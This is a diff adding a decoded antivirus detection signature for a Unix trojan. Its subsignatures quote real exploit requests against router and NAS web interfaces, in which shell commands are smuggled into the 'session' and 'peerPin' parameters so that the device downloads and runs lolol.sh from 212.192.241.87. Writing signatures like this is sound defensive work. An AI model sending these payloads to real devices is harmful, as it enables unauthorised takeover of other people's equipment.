@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Trojan.Generic-9907472-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: 0&1&2&3&4
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+GET /backupmgt/localJob.php?session=fail;cd+/tmp;wget+http://212.192.241.87/lolol.sh;curl+-O+http://212.192.241.87/lolol.sh;sh+l
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+POST /goform/formSysCmd HTTP/1.1
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+submit-url=%2Fwlwps.asp&resetUnCfg=0&peerPin=12345678;cd /tmp; wget http://212.192.241.87/lolol.sh; curl -O http://212.192.241.8
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+7/lolol.sh; chmod 777 lolol.sh; sh lolol.sh;&setPIN=Start+PIN&configVxd=off&resetRptUnCfg=0&peerRptPin=
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+POST /goform/formWsc HTTP/1.1
